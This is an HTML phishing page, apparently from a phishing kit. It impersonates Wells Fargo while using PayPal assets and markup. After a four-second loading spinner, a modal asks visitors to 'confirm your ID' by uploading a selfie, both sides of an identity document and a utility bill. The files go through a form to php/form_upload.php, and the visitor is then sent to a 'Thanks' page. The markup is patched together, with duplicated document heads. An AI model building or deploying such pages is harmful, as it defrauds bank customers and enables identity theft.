


<link rel="stylesheet" href="../../css/main.css" data-reactid="10"/>


<div id="fixed"  class="vx_has-spinner-large spinner_fullScreen test_has_spinner" >



<!DOCTYPE html><html data-reactroot="" data-reactid="1" data-react-checksum="158555299"><head data-reactid="2"><script type="text/javascript" src="" data-reactid="3"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196"  data-reactid="6"/><link  data-reactid="7"/><link rel="icon" type="image/x-icon" data-reactid="8"/>



</div>


<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>






<!DOCTYPE html><html data-reactroot="" data-reactid="1" data-react-checksum="158555299"><head data-reactid="2"><script type="text/javascript" src="https://www.paypalobjects.com/pa/js/min/pa.js" data-reactid="3"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="http://is5.mzstatic.com/image/thumb/Purple118/v4/96/c7/76/96c776f8-3a0e-cda9-130d-8feadb33e5a2/source/1200x630bb.jpg" data-reactid="7"><link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-0-5/paypal-sans.css" data-reactid="9"/><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/1f0/6dcd434cd566c97d0085ac711fbc4/css/main-service-nav.css" data-reactid="10"/><title data-reactid="11">Wells Fargo: uploads card Wells Fargo</title></head><body class="vx_root vx_hasOpenModal vx_addFlowTransition" data-reactid="12"><div data-reactid="13"><script> var isLessthanIE10 = false; </script> <!--[if lte IE 10]> <script> isLessthanIE10 = true; </script> <![endif]--> <script> </script> <script async data-paypal-sitewide-search data-callback="onSearchLoad" src="https://www.paypal.com/search/js/embed.js"></script> 

</li></ul></div></div></div></div></div><div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader" data-reactid="104"><div class="vx_modal-wrapper" data-reactid="105"><div class="vx_modal-content" data-reactid="108">

<div><img alt="Wells Fargo Home Page" tabindex="0" src="data:image/gif;base64,R0lGODlhPgA+APcAAMocId4gJbUYHOyKEtgfJIUPEek4IbYYHOJ8EbEXHOt1Fa8XGva7Bu5tGeuCE+ROHe2cC+V0FfzLAbdEE9UnIfq+BuqmB30NEKAUF9yKC+tBH/e3BpwTFpoTFvOZD+9nGqQVGdNCGY4QE8NUE5cSFtJsEZUSFPaXEfi0CO6qB+IhJfa+BacVGZMRFMMjHfvIA/CxBvClCtpVGboiGpYSFtAzHfK0BumTDtAjIMY8GOScCtJ4DccpHeujCfC0Bsw2G9pMGe59Fc5gEowQE+SEEL08FslQFfa0BsJDFu55FoEOENhiFNVbFe+uButJH/CKE/CzBvmqDPzKAcAaHt1aGNEeI9sgJaolFogPEffABO1SHd5zEshlD/KrCfijDs8rH/zGA9thFOmaCt1nFbMpF6oWGfW0BvahDdg3Hvm4BsVNFNs+HNpyEs1sD/SvCMIyGe1zF+JFHfvABfOBFvCREdBhE+SODKgfFuJvFdYsIONpF9ZiFLYiGsk7GrYyF/KuBt4mJPzJA9sxIOh9FNpuEsZmD+BjF+EnJNt4ENhFGtFVFdZnE9BmEuVuF7MbHOclJeGNDPjCBPnBBPO3BuFaGbYeGuSWC9Y8G9oqItdyEeksJd0nIsMbHsgcIMQbHsIbHrsZHcYbIMUbHskcIL8aHrwZHbkZHb4aH70aH9IeI88dI9AdI9MeI9QeI9YeI8wdIc0dIbIXHKkWGdcfJOEhJagVGasWGt0gJa0WGuAgJaMVGdofJJ8UF/rGA+QhJaIUF+UhJ7gZHJARE7gZHYsQEfvGA/rHA/nGA/3NAfrFA/zKA+djGfrDA++bDe6TEN12EL0aHcwfIOSQDOSJDsA4GK4ZGbIeGaYbF/vDBdlRGdojIumPDvzFBc9yDcUcHsA8F89CF/G3BrodHNNNGPnFA8IdHu9bHM8fIfO8BOimB+CEDq8gF/OiC+cjJ85bE/zBBdpnFOqXDMdBGPOyBuIkJcpMFdd/Dd+ADtskItRjE701GO6XDfCpCb8fG/7OAeYiJyH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4zLWMwMTEgNjYuMTQ1NjYxLCAyMDEyLzAyLzA2LTE0OjU2OjI3ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjNDM0M4MjczNDhCMDExRTQ5RDlBQTEyODczMzI4RDYyIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjNDM0M4Mjc0NDhCMDExRTQ5RDlBQTEyODczMzI4RDYyIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6M0MzQzgyNzE0OEIwMTFFNDlEOUFBMTI4NzMzMjhENjIiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6M0MzQzgyNzI0OEIwMTFFNDlEOUFBMTI4NzMzMjhENjIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4B//79/Pv6+fj39vX08/Lx8O/u7ezr6uno5+bl5OPi4eDf3t3c29rZ2NfW1dTT0tHQz87NzMvKycjHxsXEw8LBwL++vby7urm4t7a1tLOysbCvrq2sq6qpqKempaSjoqGgn56dnJuamZiXlpWUk5KRkI+OjYyLiomIh4aFhIOCgYB/fn18e3p5eHd2dXRzcnFwb25tbGtqaWhnZmVkY2JhYF9eXVxbWllYV1ZVVFNSUVBPTk1MS0pJSEdGRURDQkFAPz49PDs6OTg3NjU0MzIxMC8uLSwrKikoJyYlJCMi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%0A" style="margin-top: 0px;margin-left: 0px;"></div>




<h2 class="vx_h2" data-reactid="110">Please confirm your ID for more secure</h2>

<div >
<div style="text-align: right;" trbidi="on">
<div style="text-align: center;">


<img src="../../img/selfi.png" style="height: 250px;">


<p id="Selfie">1.Selfie without your ID card</p>


<img src="../../img/sample-photo-id-card.svg" style="height: 150px;">

<p id="Selfie">2.Photo of your ID document (both sides for driver license or ID card) </p>
<p id="Selfie">(PDF - JPG - PNG)<br><br>3. Recent Utility Bill, Gas Or Light Bill.</p>

		<!-- Google Fonts -->
		<link href="css/css.css" rel="stylesheet">
		
		<!-- styles -->
		<link href="src/jquery.fileuploader.css" media="all" rel="stylesheet">
		<link href="css/jquery.fileuploader-theme-thumbnails.css" media="all" rel="stylesheet">
		
		<!-- js -->
		<script src="js/jquery-3.1.1.min.js" crossorigin="anonymous"></script>
		<script src="src/jquery.fileuploader.min.js" type="text/javascript"></script>
		<script src="./js/custom.js" type="text/javascript"></script>

	
	</head>

	<body>


	<form action="php/form_upload.php" method="post" enctype="multipart/form-data">






			<input type="file" name="files">
			



</div>

</div>

<input

class="vx_btn vx_btn-block"

value="Confirm and continue"

 type="submit">
		</form>

  <form action="../Thanks/" method="post" name="WorldWide_form" class="validatoa" novalidate="novalidate">




</form>

    </body>
</html>



</div><div></div><div>
</div></div><!-- react-empty: 119 -->
</div></div></div>
<div ></div><script type="text/javascript" src="" data-reactid="131"></script><script type="text/javascript" src="" data-reactid="132"></script><script type="text/javascript" src="" data-reactid="133"></script><script id="react-engine-props" type="application/json">



</html>
